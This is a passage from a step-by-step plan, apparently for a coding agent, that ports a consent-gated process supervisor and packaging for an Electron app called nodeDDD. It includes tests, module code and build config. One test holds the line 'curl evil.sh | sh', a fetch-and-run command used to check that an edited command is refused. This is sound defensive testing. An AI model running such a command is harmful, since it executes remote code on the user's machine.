 * supervised there at all rather than half-supervised.
 */
export function terminate(pid: number): void {
  if (process.platform === "win32") throw new Error(WIN_MESSAGE);
  process.kill(pid, "SIGTERM");
}
```
- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/products/proc.test.ts` — expected: PASS.
- [ ] **Step 5: Commit**
```bash
git add src/core/products/proc.ts src/core/products/proc.test.ts
git commit -m "feat(products): port proc — batched ps reads and SIGTERM"
```

---

### Task 6: Supervision (spawn, adopt, stop)

**Files:**
- Create: `src/core/products/supervise.ts`
- Test: `src/core/products/supervise.test.ts`

**Interfaces:**
- Consumes: `EnvRoot` (type), `Product`/`ProductDecl` (types) from `../models`; `readJson`/`writeJson` from `../store`; `record`/`optional`/`isArray` from `../json`; `DddError`; `* as consent`/`* as declare`/`* as log`/`* as proc` and `Record`/`ProcInfo`/`State`/`claim`/`stateOf`/`recordFromJson` from the sibling modules; `configOf` from `../projects` (test only).
- Produces: `interface Supervision { running: Record[] }`; `supervisionFromJson(raw): Supervision`; `keyOf(projectId, productId): string`; `records(env): Supervision`; `put(env, sup): void`; `shell(): string`; `type Spawn = (run, dir, logPath) => Promise<{ pid; startedAt; command }>`; `assemble(env, projectId, projectPath, decls): Promise<Product[]>`; `approve(env, key, run, dir): void`; `revoke(env, key): void`; `start(env, key, run, dir, spawn?): Promise<Record>`; `runningRecord(env, key): Promise<Record | null>`; `stop(env, key): Promise<State>`.

- [ ] **Step 1: Write the failing tests**
`src/core/products/supervise.test.ts`:
```ts
import { describe, expect, it } from "vitest";
import { mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scratchEnv } from "../testing";
import { configOf } from "../projects";
import * as log from "./log";
import * as proc from "./proc";
import { stateOf, type Record } from "./record";
import { approve, put, records, revoke, runningRecord, shell, start, stop } from "./supervise";

/** A command that stays up until asked to stop. */
const SERVICE = "sleep 30";

async function waitUntil(cond: () => boolean | Promise<boolean>): Promise<boolean> {
  for (let i = 0; i < 300; i++) {
    if (await cond()) return true;
    await new Promise((r) => setTimeout(r, 10));
  }
  return false;
}

describe("supervise", () => {
  it("a config file is not permission to run", async () => {
    const { env } = scratchEnv("products-consent");
    const dir = tmpdir();
    const witness = join(dir, `ddd-consent-witness-${process.pid}-${process.hrtime.bigint()}`);
    const run = `touch ${witness}`;

    await expect(start(env, "proj/evil", run, dir)).rejects.toThrow(/not approved/);

    // Approving the same command and running it proves the witness *would* have
    // been written — otherwise this only asserts that `touch` is slow.
    approve(env, "proj/evil", run, dir);
    await start(env, "proj/evil", run, dir);
    expect(await waitUntil(() => require("node:fs").existsSync(witness))).toBe(true);
    try {
      require("node:fs").rmSync(witness);
    } catch {
      /* best effort */
    }
  });

  it("editing the command after approval stops it running", async () => {
    const { env } = scratchEnv("products-changed");
    const dir = tmpdir();
    approve(env, "proj/x", "sleep 30", dir);
    await expect(start(env, "proj/x", "sleep 30 && curl evil.sh | sh", dir)).rejects.toThrow(/changed/);
  });

  it("a started product runs, is adopted and stops", async () => {
    const { env } = scratchEnv("products-lifecycle");
    const dir = tmpdir();
    approve(env, "proj/svc", SERVICE, dir);

    const record = await start(env, "proj/svc", SERVICE, dir);
    expect(record.pid).toBeGreaterThan(0);

    // Adoption: read the pid back out of the file and re-verify it, exactly
    // what happens after a restart.
    const adopted = await runningRecord(env, "proj/svc");
    expect(adopted).not.toBeNull();
    expect(adopted!.pid).toBe(record.pid);
    expect(adopted!.startedAt).toBe(record.startedAt);

    expect(await stop(env, "proj/svc")).toEqual({ state: "stopped" });
    expect(await waitUntil(async () => (await proc.info(record.pid)) === null)).toBe(true);
    expect(await runningRecord(env, "proj/svc")).toBeNull();
  });

  it("a product that exits on its own stops reading as running", async () => {
    const { env } = scratchEnv("products-exit");
    const dir = tmpdir();
    approve(env, "proj/quick", "true", dir);

    const record = await start(env, "proj/quick", "true", dir);
    expect(await waitUntil(async () => (await runningRecord(env, "proj/quick")) === null)).toBe(true);

    // And it reads as exited, not unknown: it ended, and we know when.
    const stored = records(env).running.find((r) => r.key === "proj/quick")!;
    expect(stateOf(stored, await proc.info(record.pid)).state).toBe("exited");
  });

  it("output is captured to the log", async () => {
    const { env } = scratchEnv("products-log");
    const dir = tmpdir();
    approve(env, "proj/talk", "echo hello-from-the-product", dir);
    await start(env, "proj/talk", "echo hello-from-the-product", dir);

    const path = log.file(env.productsLogDir(), "proj/talk");
    expect(await waitUntil(() => log.tail(path, 5).includes("hello-from-the-product"))).toBe(true);
    await stop(env, "proj/talk");
  });

  it("starting twice is refused rather than leaking the first", async () => {
    const { env } = scratchEnv("products-double");
    const dir = tmpdir();
    approve(env, "proj/svc", SERVICE, dir);

    const first = await start(env, "proj/svc", SERVICE, dir);
    await expect(start(env, "proj/svc", SERVICE, dir)).rejects.toThrow(/already running/);

    await stop(env, "proj/svc");
    expect(await waitUntil(async () => (await proc.info(first.pid)) === null)).toBe(true);
  });

  it("a stale record is cleared rather than signalled", async () => {
    const { env } = scratchEnv("products-stale");
    const ghost: Record = {
      key: "proj/ghost",
      projectId: "proj",
      productId: "ghost",
      // pid 1 is init, and it did not start when this record claims.
      pid: 1,
      startedAt: "not when init started",
      command: "launchd",
      since: "2026-09-10T09:00:00Z",
    };
    put(env, { running: [ghost] });

    await expect(stop(env, "proj/ghost")).rejects.toThrow(/declined/);
    expect(records(env).running).toEqual([]);
  });

  it("the shell is a login shell", () => {
    expect(shell()).not.toBe("");
  });
});

describe("reading", () => {
  it("listing reads one file per project and runs no git", () => {
    const { env } = scratchEnv("products-cheap");
    const dir = join(env.dir, "proj");
    mkdirSync(join(dir, ".ddd"), { recursive: true });
    writeFileSync(join(dir, ".ddd", "config.json"), `{"products":[{"id":"serve","run":"npm run dev"}]}`);

    const config = configOf(dir);
    expect(config.products.length).toBe(1);
    expect(config.products[0]!.run).toBe("npm run dev");
    expect(require("node:fs").existsSync(join(dir, ".git"))).toBe(false);
  });

  it("a project with no config declares nothing rather than failing", () => {
    const { env } = scratchEnv("products-noconfig");
    expect(configOf(join(env.dir, "not-there")).products).toEqual([]);
  });

  it("a malformed config declares nothing rather than failing", () => {
    const { env } = scratchEnv("products-broken");
    const dir = join(env.dir, "proj");
    mkdirSync(join(dir, ".ddd"), { recursive: true });
    writeFileSync(join(dir, ".ddd", "config.json"), "{ not json");
    expect(configOf(dir).products).toEqual([]);
  });
});
```
- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/products/supervise.test.ts` — expected: fails to resolve `./supervise`.
- [ ] **Step 3: Write the module**
`src/core/products/supervise.ts`:
```ts
/**
 * Products: the things a repo knows how to run. Port of `products/mod.rs`.
 *
 * A product outlives DDD — "start and leave up" — so children are spawned into
 * their own process group and DDD never waits on them. The only thing that
 * survives a restart is a PID in a file, hence `record`. Nothing runs
 * unapproved (`consent`), and it runs through your login shell (`shell`), a
 * deliberately wide door whose lock is consent.
 */
import { spawn as spawnProcess } from "node:child_process";
import { closeSync, mkdirSync, openSync, statSync } from "node:fs";
import { DddError } from "../error";
import { isArray, optional, record } from "../json";
import type { EnvRoot } from "../paths";
import type { Product, ProductDecl } from "../models";
import { readJson, writeJson } from "../store";
import * as consent from "./consent";
import * as declare from "./declare";
import * as log from "./log";
import * as proc from "./proc";
import { claim, recordFromJson, stateOf, type Record, type State } from "./record";

/** `<env>/products.json`. */
export interface Supervision {
  running: Record[];
}

export function supervisionFromJson(raw: unknown): Supervision {
  const o = record(raw, "products");
  return { running: optional(o, "running", isArray, [] as unknown[]).map(recordFromJson) };
}

export function keyOf(projectId: string, productId: string): string {
  return `${projectId}/${productId}`;
}

/** A missing or unreadable file means nothing is running (Rust's
 *  `read_json(..).unwrap_or_default()`). */
export function records(env: EnvRoot): Supervision {
  try {
    return readJson(env.productsFile(), supervisionFromJson, () => ({ running: [] }));
  } catch {
    return { running: [] };
  }
}

export function put(env: EnvRoot, sup: Supervision): void {
  writeJson(env.productsFile(), sup);
}

/**
 * products.json is a read-modify-write, and `start` awaits the spawn between
 * reading the `running` list and writing it back. Node is single-threaded, but
 * `await` yields, so two starts (or a start racing a stop) could each read the
 * same list, spawn, and write — the second clobbering the first's record and
 * orphaning its process. Every mutation is therefore funnelled through one
 * promise chain: each call waits for the previous to settle before it reads, so
 * no two ever interleave. Reads (`assemble`, `runningRecord` on its own) do not
 * need the gate; approvals live in a different file and are written
 * synchronously, so they cannot interleave either.
 */
let productsGate: Promise<unknown> = Promise.resolve();
function serialize<T>(work: () => Promise<T>): Promise<T> {
  const runNext = productsGate.then(work, work);
  productsGate = runNext.then(
    () => undefined,
    () => undefined,
  );
  return runNext;
}

/** Which shell to run a product through: `$SHELL -l -c '<run>'`. The `-l` is
 *  the point — a GUI process on macOS inherits launchd's environment, with none
 *  of the PATH, version-manager shims or direnv hooks a product needs. */
export function shell(): string {
  return process.env.SHELL ?? "/bin/sh";
}

function isDir(path: string): boolean {
  try {
    return statSync(path).isDirectory();
  } catch {
    return false;
  }
}

/** How a product is launched. Injectable so a test could fake it; defaults to
 *  the real spawn for the platform. */
export type Spawn = (run: string, dir: string, logPath: string) => Promise<{ pid: number; startedAt: string; command: string }>;

const unixSpawn: Spawn = async (run, dir, logPath) => {
  // One descriptor, opened once and handed to both stdout and stderr, like the
  // Rust's `try_clone`. The child inherits its own copy; the parent closes it.
  const fd = openSync(logPath, "a");
  let pid: number | undefined;
  try {
    const child = spawnProcess(shell(), ["-l", "-c", run], {
      cwd: dir,
      stdio: ["ignore", fd, fd],
      // Its own process group, so a signal aimed at DDD does not take every
      // product with it. `unref` and no `exit` listener: the product outlives
      // us, and the record on disk is the only registry.
      detached: true,
    });
    child.unref();
    pid = child.pid;
  } finally {
    closeSync(fd);
  }
  if (pid === undefined) {
    throw DddError.config("the command exited before it could be recorded — check the log");
  }
  // Read the OS start time immediately. `proc.infos` treats the eventual zombie
  // as gone, which is how the product's exit becomes visible later.
  const found = await proc.info(pid);
  if (found === null) {
    throw DddError.config("the command exited before it could be recorded — check the log");
  }
  return { pid, startedAt: found.startedAt, command: found.command };
};

const win32Spawn: Spawn = async () => {
  throw DddError.config(
    "running products is not offered on Windows: the only way to stop one would be a force kill",
  );
};

const defaultSpawn: Spawn = process.platform === "win32" ? win32Spawn : unixSpawn;

/** Everything the widget needs about one declared product. */
export async function assemble(
  env: EnvRoot,
  projectId: string,
  projectPath: string,
  decls: ProductDecl[],
): Promise<Product[]> {
  const supervision = records(env);
  const approvals = consent.load(env.productApprovalsFile());
  const usable = declare.usable(projectPath, decls);

  const pids: number[] = [];
  for (const d of usable) {
    const rec = supervision.running.find((r) => r.key === keyOf(projectId, d.decl.id));
    if (rec !== undefined) pids.push(rec.pid);
  }
  const live = await proc.infos(pids);

  return usable.map((d) => {
    const key = keyOf(projectId, d.decl.id);
    const rec = supervision.running.find((r) => r.key === key);
    const state = stateOf(rec, rec !== undefined ? live.get(rec.pid) : undefined);
    const missing = consent.check(approvals, key, d.decl.run, d.dir);
    return {
      key,
      projectId,
      productId: d.decl.id,
      name: declare.label(d.decl),
      run: d.decl.run,
      dir: d.dir,
      port: d.decl.port,
      // The directory has to exist before the command means anything, and a
      // checkout that moved is the common way it stops doing.
      dirExists: isDir(d.dir),
      needsApproval: missing === null ? null : consent.missingMessage(missing),
      state,
      log: log.tail(log.file(env.productsLogDir(), key), 6),
    };
  });
}

/** Approve this exact command, in this exact directory. */
export function approve(env: EnvRoot, key: string, run: string, dir: string): void {
  consent.approve(env.productApprovalsFile(), key, consent.token(run, dir));
}

export function revoke(env: EnvRoot, key: string): void {
  consent.revoke(env.productApprovalsFile(), key);
}

/** Start a product, detached, with its output captured. */
export function start(
  env: EnvRoot,
  key: string,
  run: string,
  dir: string,
  spawn: Spawn = defaultSpawn,
): Promise<Record> {
  return serialize(async () => {
    const approvals = consent.load(env.productApprovalsFile());
    const missing = consent.check(approvals, key, run, dir);
    if (missing !== null) throw DddError.config(consent.missingMessage(missing));

    if (!isDir(dir)) throw DddError.notFound(`${dir} is not a directory`);
    const existing = await runningRecord(env, key);
    if (existing !== null) {
      throw DddError.config(`already running as pid ${existing.pid} — stop it first`);
    }

    const logDir = env.productsLogDir();
    mkdirSync(logDir, { recursive: true });
    const logPath = log.file(logDir, key);
    // The only moment we are the log's only writer.
    log.trim(logPath);

    const { pid, startedAt, command } = await spawn(run, dir, logPath);
    const since = new Date().toISOString();

    const supervision = records(env);
    supervision.running = supervision.running.filter((r) => r.key !== key);
    const parts = key.split("/");
    const entry: Record = {
      key,
      projectId: parts[0] ?? "",
      productId: parts[1] ?? "",
      pid,
      startedAt,
      command,
      since,
    };
    supervision.running.push(entry);
    put(env, supervision);
    return entry;
  });
}

/** The record for a product, but only if it still passes the guard. */
export async function runningRecord(env: EnvRoot, key: string): Promise<Record | null> {
  const supervision = records(env);
  const rec = supervision.running.find((r) => r.key === key);
  if (rec === undefined) return null;
  return claim(rec, await proc.info(rec.pid)).kind === "ours" ? rec : null;
}

/**
 * Ask a product to stop, and forget it. The guard runs first and the signal
 * only follows it. A record that no longer verifies is dropped rather than
 * signalled: the PID it names belongs to something else now.
 */
export function stop(env: EnvRoot, key: string): Promise<State> {
  return serialize(async () => {
    const supervision = records(env);
    const rec = supervision.running.find((r) => r.key === key);
    if (rec === undefined) return { state: "stopped" };

    const c = claim(rec, await proc.info(rec.pid));
    supervision.running = supervision.running.filter((r) => r.key !== key);
    put(env, supervision);

    if (c.kind === "ours") {
      try {
        proc.terminate(rec.pid);
      } catch (e) {
        throw DddError.config(`could not stop it: ${e instanceof Error ? e.message : String(e)}`);
      }
      return { state: "stopped" };
    }
    if (c.kind === "gone") return { state: "exited", since: rec.since };
    throw DddError.config(
      `declined: pid ${rec.pid} belongs to ${c.now} now, not to this product — the record has been cleared`,
    );
  });
}
```
- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/products/supervise.test.ts` — expected: PASS. (These start real `sleep`/`true`/`echo` processes; each test stops what it starts.)
- [ ] **Step 5: Commit**
```bash
git add src/core/products/supervise.ts src/core/products/supervise.test.ts
git commit -m "feat(products): port supervise — assemble/start/stop with a write mutex"
```

---

### Task 7: The six commands, the u16 port guard, and NOT_YET_PORTED

**Files:**
- Modify: `src/core/models.ts` (tighten `productDeclFromJson` to a u16 port)
- Modify: `src/core/models.test.ts` (add the u16-port rejection test)
- Modify: `src/main/commands.ts` (add the six product commands)
- Modify: `src/main/commands.test.ts` (empty `NOT_YET_PORTED`, add the product flow tests)

**Interfaces:**
- Consumes: `supervise.assemble/approve/revoke/start/stop`, `log.file/tail` from `../core/products/*`; `projects.registry`, `projects.configOf`; `events.log`; `EnvRoot.open` via `root`; `Product` type from `../core/models`.
- Produces: registry handlers `products_list`, `product_approve`, `product_revoke`, `product_start`, `product_stop`, `product_log`; exported `isU16` guard in `models.ts` is internal (not exported) — mirror the existing internal `isU32`.

- [ ] **Step 1: Write the failing tests**

First, in `src/core/models.test.ts`, add a test next to the existing product tests (after the `it("defaults a product's port when omitted", ...)` case, before the closing `});` of that describe block):
```ts
  it("rejects a non-u16 product port", () => {
    // The Rust is `Option<u16>`: a fraction, a negative, or anything past
    // 65535 is refused rather than silently coerced.
    expect(() => productDeclFromJson({ id: "web", run: "r", port: 65536 })).toThrow(/invalid type for field `port`/);
    expect(() => productDeclFromJson({ id: "web", run: "r", port: -1 })).toThrow(/invalid type for field `port`/);
    expect(() => productDeclFromJson({ id: "web", run: "r", port: 1.5 })).toThrow(/invalid type for field `port`/);
    expect(productDeclFromJson({ id: "web", run: "r", port: 8080 }).port).toBe(8080);
  });
```

Then in `src/main/commands.test.ts`, change `NOT_YET_PORTED` to empty:
```ts
const NOT_YET_PORTED = new Set<string>([]);
```
Add `Product` to the models type import (line ~18):
```ts
import type { Item, Product } from "../core/models";
```
And add a products describe block (place it near the end of the file, before the final closing lines):
```ts
async function waitUntil(cond: () => boolean | Promise<boolean>): Promise<boolean> {
  for (let i = 0; i < 300; i++) {
    if (await cond()) return true;
    await new Promise((r) => setTimeout(r, 10));
  }
  return false;
}

describe("products commands", () => {
  function seed() {
    const { env } = scratchEnv("cmd-products");
    const dir = mkdtempSync(join(tmpdir(), "ddd-proj-"));
    mkdirSync(join(dir, ".ddd"), { recursive: true });
    writeFileSync(
      join(dir, ".ddd", "config.json"),
      JSON.stringify({
        products: [
          { id: "svc", run: "sleep 30" },
          { id: "talk", run: "echo hello-from-the-product" },
        ],
      }),
    );
    const entry = register(env, dir);
    return { env, projectId: entry.id };
  }

  it("lists a product needing approval, then approves, starts, and stops it", async () => {
    const { projectId } = seed();

    let rows = (await commands.products_list!({ env: "default" })) as Product[];
    const declared = rows.find((r) => r.productId === "svc")!;
    expect(declared.needsApproval).toBeTruthy();
    expect(declared.state).toEqual({ state: "stopped" });

    commands.product_approve!({ env: "default", key: declared.key, run: declared.run, dir: declared.dir });
    await commands.product_start!({ env: "default", key: declared.key, run: declared.run, dir: declared.dir });

    rows = (await commands.products_list!({ env: "default" })) as Product[];
    const running = rows.find((r) => r.productId === "svc")!;
    expect(running.needsApproval).toBeFalsy();
    expect(running.state.state).toBe("running");
    const pid = (running.state as { pid: number }).pid;
    expect(pid).toBeGreaterThan(0);

    const startRows = (await commands.events_query!({ env: "default", kindPrefix: "product.start" })) as {
      kind: string;
      project: string;
      meta: { product: string; pid: number };
    }[];
    expect(startRows.length).toBe(1);
    expect(startRows[0]!.project).toBe(projectId);
    expect(startRows[0]!.meta.product).toBe("svc");
    expect(startRows[0]!.meta.pid).toBe(pid);

    const stopped = await commands.product_stop!({ env: "default", key: declared.key });
    expect(stopped).toEqual({ state: "stopped" });
    // Idempotent: a second stop with no record still reports stopped.
    const again = await commands.product_stop!({ env: "default", key: declared.key });
    expect(again).toEqual({ state: "stopped" });

    const stopRows = (await commands.events_query!({ env: "default", kindPrefix: "product.stop" })) as {
      kind: string;
      meta: unknown;
    }[];
    expect(stopRows.length).toBeGreaterThanOrEqual(1);
    expect(stopRows[0]!.meta).toBeNull();

    expect(
      await waitUntil(async () => {
        const now = (await commands.products_list!({ env: "default" })) as Product[];
        return now.find((r) => r.productId === "svc")!.state.state !== "running";
      }),
    ).toBe(true);
  });

  it("captures a product's output to the log", async () => {
    seed();
    const rows = (await commands.products_list!({ env: "default" })) as Product[];
    const talk = rows.find((r) => r.productId === "talk")!;
    commands.product_approve!({ env: "default", key: talk.key, run: talk.run, dir: talk.dir });
    await commands.product_start!({ env: "default", key: talk.key, run: talk.run, dir: talk.dir });

    expect(
      await waitUntil(async () => ((await commands.product_log!({ env: "default", key: talk.key })) as string).includes("hello-from-the-product")),
    ).toBe(true);
    await commands.product_stop!({ env: "default", key: talk.key });
  });
});
```
(`mkdtempSync`, `tmpdir`, `mkdirSync`, `writeFileSync`, `join`, `register`, and `describe/it/expect` are already imported in `commands.test.ts`.)

- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/models.test.ts src/main/commands.test.ts` — expected: FAIL (the u16 test fails because `isNumber` still admits 65536; the product handlers are absent, so `commands.products_list` is `undefined`).

- [ ] **Step 3: Write the code**

In `src/core/models.ts`, add a `isU16` guard next to the existing `isU32` (which is defined just above `itemFilterFromJson`) and use it in `productDeclFromJson`. Add near the top of the products section (right after the `productDeclFromJson` doc comment, or beside `isU32`):
```ts
// `ProductDecl.port` is `Option<u16>` in the Rust; `serde_json` refuses a
// fraction, a negative, and anything past u16::MAX. Mirrors `isU32` for
// `ItemFilter.limit` — `isNumber` alone would accept all three.
const isU16 = (v: unknown): v is number => typeof v === "number" && Number.isInteger(v) && v >= 0 && v <= 65_535;
```
Change the `port` line in `productDeclFromJson`:
```ts
    port: optional(o, "port", isU16, null as number | null),
```

In `src/main/commands.ts`, add the imports (after the existing `eol*` imports, around line 59):
```ts
import * as supervise from "../core/products/supervise";
import * as productLog from "../core/products/log";
```
Add `Product` to the models type import (line ~61):
```ts
import type { Item, ItemFilter, Product, Settings } from "../core/models";
```
Add the handlers inside the `createCommands` return object, in a new section before `// --- MCP`:
```ts
    // --- products: what a repo declares it can run, behind a consent gate ---

    /** Every product every registered project declares, with its live state.
     *  `configOf`, not `load`: this refreshes on a timer and must run no git;
     *  an unreadable config declares nothing rather than failing the board. */
    products_list: async ({ env }) => {
      const r = root(env);
      const reg = projects.registry(r);
      const all: Product[] = [];
      for (const entry of reg.projects) {
        const config = projects.configOf(entry.path);
        if (config.products.length === 0) continue;
        all.push(...(await supervise.assemble(r, entry.id, entry.path, config.products)));
      }
      return all;
    },

    /** Approve exactly what the caller is looking at — the command and directory
     *  passed, not a re-read of a file that may have changed since the render. */
    product_approve: ({ env, key, run, dir }) =>
      supervise.approve(root(env), String(key), String(run), String(dir)),
    product_revoke: ({ env, key }) => supervise.revoke(root(env), String(key)),

    /** Start a product. Refuses unless this exact command has been approved. */
    product_start: async ({ env, key, run, dir }) => {
      const r = root(env);
      const record = await supervise.start(r, String(key), String(run), String(dir));
      events.log(r, {
        kind: "product.start",
        source: "local",
        project: record.projectId,
        tokensIn: null,
        tokensOut: null,
        costMicros: null,
        meta: { product: record.productId, pid: record.pid },
      });
    },

    /** Ask a product to stop: `SIGTERM`, only after the guard passes. Returns
     *  the resulting state. */
    product_stop: async ({ env, key }) => {
      const r = root(env);
      const state = await supervise.stop(r, String(key));
      events.log(r, {
        kind: "product.stop",
        source: "local",
        project: String(key).split("/")[0] ?? "",
        tokensIn: null,
        tokensOut: null,
        costMicros: null,
        meta: null,
      });
      return state;
    },

    /** The whole captured log, for the panel behind "output". */
    product_log: async ({ env, key }) => {
      const r = root(env);
      return productLog.tail(productLog.file(r.productsLogDir(), String(key)), 400);
    },
```

- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/models.test.ts src/main/commands.test.ts` — expected: PASS. Then `npx vitest run` (or `npm test`) to confirm the whole suite, including the registry-contract test, is green with `NOT_YET_PORTED` empty.

- [ ] **Step 5: Commit**
```bash
git add src/core/models.ts src/core/models.test.ts src/main/commands.ts src/main/commands.test.ts
git commit -m "feat(products): wire the six product commands and tighten the port guard"
```


---

### Task 8: electron-builder packaging

**Files:**
- Create: `electron-builder.yml`, `build/entitlements.mac.plist`, `build/icon.icns`, `build/icon.ico`, `build/icon.png`
- Modify: `package.json` (devDependency + scripts)

**Interfaces:**
- Produces: `npm run dist` (host-platform installers) and `npm run dist:dir` (an unpacked, unsigned app for verification).

- [ ] **Step 1: Add electron-builder and the scripts**

Run: `npm install --save-dev electron-builder@26` (or the latest 26.x; record the exact version installed in the report). Then add to `package.json` `scripts`:

```json
"dist": "npm run build && electron-builder",
"dist:dir": "npm run build && electron-builder --dir"
```

`npm run build` already runs `electron-vite build` into `out/` (main, preload, renderer).

- [ ] **Step 2: Copy the icons from the Rust app**

```bash
mkdir -p build
cp ../DDD/src-tauri/icons/icon.icns build/icon.icns
cp ../DDD/src-tauri/icons/icon.ico build/icon.ico
cp ../DDD/src-tauri/icons/icon.png build/icon.png
```

electron-builder resolves `build/icon.icns` (mac), `build/icon.ico` (win) and `build/icon.png` (linux, must be at least 512×512 — check `sips -g pixelWidth ../DDD/src-tauri/icons/icon.png`; if it is smaller, use `sips -z 512 512 ../DDD/src-tauri/icons/icon.png --out build/icon.png`).

- [ ] **Step 3: Write `electron-builder.yml`**

```yaml
appId: com.renegerrits.nodeddd
productName: nodeDDD
# A distinct appId from the Rust app (com.renegerrits.ddd) so both can be
# installed side by side; they still share ~/.ddd through the path layer.
directories:
  output: dist
  buildResources: build
# electron-vite emits the app into out/; ship that plus the runtime deps.
files:
  - out/**/*
  - package.json
# imapflow, postal-mime and @modelcontextprotocol/sdk are runtime requires
# (externalized by electron-vite), so their node_modules must be bundled.
# electron-builder includes production dependencies from package.json by default.
asarUnpack:
  # The MCP fixture and the claude-code scripts are read from disk at runtime.
  - out/**/fixtures/**
mac:
  category: public.app-category.developer-tools
  target:
    - dmg
    - zip
  hardenedRuntime: true
  entitlements: build/entitlements.mac.plist
  entitlementsInherit: build/entitlements.mac.plist
  # Signing/notarization are intentionally NOT configured here: they need an
  # Apple Developer identity and credentials. An unsigned build is produced
  # for local use; CI supplies CSC_LINK / APPLE_ID env vars when releasing.
win:
  target:
    - nsis
linux:
  target:
    - AppImage
    - deb
  category: Development
```

`build/entitlements.mac.plist`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>com.apple.security.cs.allow-jit</key>
  <true/>
  <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
  <true/>
  <key>com.apple.security.cs.disable-library-validation</key>
  <true/>
  <key>com.apple.security.cs.allow-dyld-environment-variables</key>
  <true/>
</dict>
</plist>
```

- [ ] **Step 4: Verify the macOS build produces a launchable app**

Run: `CSC_IDENTITY_AUTO_DISCOVERY=false npm run dist:dir 2>&1 | tail -20` — expected: electron-builder completes and writes `dist/mac-arm64/nodeDDD.app` (or `dist/mac/nodeDDD.app` on Intel). Confirm the bundle exists and its Info.plist carries the id:

```bash
APP=$(ls -d dist/mac*/nodeDDD.app | head -1)
test -d "$APP" && echo "app built: $APP"
/usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$APP/Contents/Info.plist"
```

Expected: prints `app built: …` and `com.renegerrits.nodeddd`. (A full `dist` with dmg/zip and Windows/Linux targets is not built or verified here — those need their own OS or cross-build tooling; the config targets them for a release pipeline. Note this in the report.)

- [ ] **Step 5: Gitignore the build output and commit**

Ensure `dist/` is git-ignored (add to `.gitignore` if not already). Then:

```bash
git add package.json package-lock.json electron-builder.yml build/entitlements.mac.plist build/icon.icns build/icon.ico build/icon.png .gitignore
git commit -m "build: electron-builder packaging for macOS, Windows and Linux"
```

---

### Task 9: The Claude Code scripts

**Files:**
- Create: `claude-code/bin/ddd-todo`, `claude-code/bin/ddd-recap`, `claude-code/hooks/ddd-session-end.sh`, `claude-code/commands/todo.md`, `claude-code/commands/wrapup.md`, `claude-code/install.sh`, `claude-code/README.md`

**Interfaces:**
- Produces: the `/todo` and recap integration, copied verbatim from the Rust app (they are path-agnostic and write into a project's `.ddd/`).

- [ ] **Step 1: Copy the scripts verbatim**

```bash
mkdir -p claude-code/bin claude-code/hooks claude-code/commands
cp ../DDD/claude-code/bin/ddd-todo claude-code/bin/ddd-todo
cp ../DDD/claude-code/bin/ddd-recap claude-code/bin/ddd-recap
cp ../DDD/claude-code/hooks/ddd-session-end.sh claude-code/hooks/ddd-session-end.sh
cp ../DDD/claude-code/commands/todo.md claude-code/commands/todo.md
cp ../DDD/claude-code/commands/wrapup.md claude-code/commands/wrapup.md
cp ../DDD/claude-code/install.sh claude-code/install.sh
chmod +x claude-code/bin/ddd-todo claude-code/bin/ddd-recap claude-code/hooks/ddd-session-end.sh claude-code/install.sh
```

- [ ] **Step 2: Read each copied file end to end and confirm it is portable**

Read all six files. They write only into `<project>/.ddd/todos.json` and `<project>/.ddd/recap.md` and register a Claude Code `SessionEnd` hook; they contain no path specific to the Rust app's build. If any file hard-codes a path under the DDD Rust tree or a Tauri-specific location, note it in the report and leave the file unchanged (they are the source of truth for the contract DDD and nodeDDD share). Confirm `install.sh` is idempotent (backs up `~/.claude/settings.json` before editing) by reading it.

- [ ] **Step 3: Write `claude-code/README.md`**

A short README: what the two commands do (`/todo` appends to `<project>/.ddd/todos.json`, which the Todo widget reads; the SessionEnd hook writes `<project>/.ddd/recap.md`, which the recap surface reads), that `install.sh` symlinks the bins into `~/.local/bin`, copies the command defs into `~/.claude/commands`, and registers the hook in `~/.claude/settings.json`, and that these are identical to the Rust app's copies so a single install serves both.

- [ ] **Step 4: Commit**

```bash
git add claude-code
git commit -m "feat(claude-code): the /todo and recap integration scripts"
```

---

### Task 10: Smoke, README, the empty contract set

**Files:**
- Modify: `src/main/index.ts`, `README.md`, `src/main/commands.test.ts`

**Interfaces:**
- Consumes: the six product commands (Task 7).

- [ ] **Step 1: The contract test is now complete**

Run: `npx vitest run src/main/commands.test.ts` — expected: PASS, and `NOT_YET_PORTED` in `src/main/commands.test.ts` is now the empty set `new Set([])` (Task 7 removed the last six names). If any name remains, remove it here. The contract test now proves every command in the Rust `generate_handler!` is registered.

- [ ] **Step 2: Smoke**

In `src/main/index.ts`, inside `smoke()`, directly after `console.log("ddd: smoke mcp ok");` and before the CSP probe, add a products round trip against a real short-lived product (no network, no long-lived process left behind):

```ts
      // Phase 6: a product declared in a scratch project, approved, started,
      // logged and stopped — the whole supervision loop, end to end.
      const proj = join(home, "svc-project");
      mkdirSync(join(proj, ".ddd"), { recursive: true });
      writeFileSync(join(proj, ".ddd", "config.json"), JSON.stringify({ products: [{ id: "svc", run: "echo hello-product && sleep 30" }] }));
      await invoke("project_register", { env: "default", path: proj });
      const before = (await invoke("products_list", { env: "default" })) as { key: string; needsApproval: string | null; run: string; dir: string }[];
      const svc = before.find((p) => p.key.endsWith("/svc"));
      if (!svc || !svc.needsApproval) throw new Error(`products_list: expected an unapproved svc, got ${JSON.stringify(before)}`);
      await invoke("product_approve", { env: "default", key: svc.key, run: svc.run, dir: svc.dir });
      await invoke("product_start", { env: "default", key: svc.key, run: svc.run, dir: svc.dir });
      const running = (await invoke("products_list", { env: "default" })) as { key: string; state: { state: string } }[];
      const now = running.find((p) => p.key === svc.key)!;
      if (now.state.state !== "running") throw new Error(`product_start: expected running, got ${JSON.stringify(now.state)}`);
      // Wait for the echoed line to reach the log, then stop it.
      let logged = "";
      for (let i = 0; i < 100 && !logged.includes("hello-product"); i++) {
        logged = (await invoke("product_log", { env: "default", key: svc.key })) as string;
        await new Promise((r) => setTimeout(r, 50));
      }
      if (!logged.includes("hello-product")) throw new Error("product_log: nothing captured");
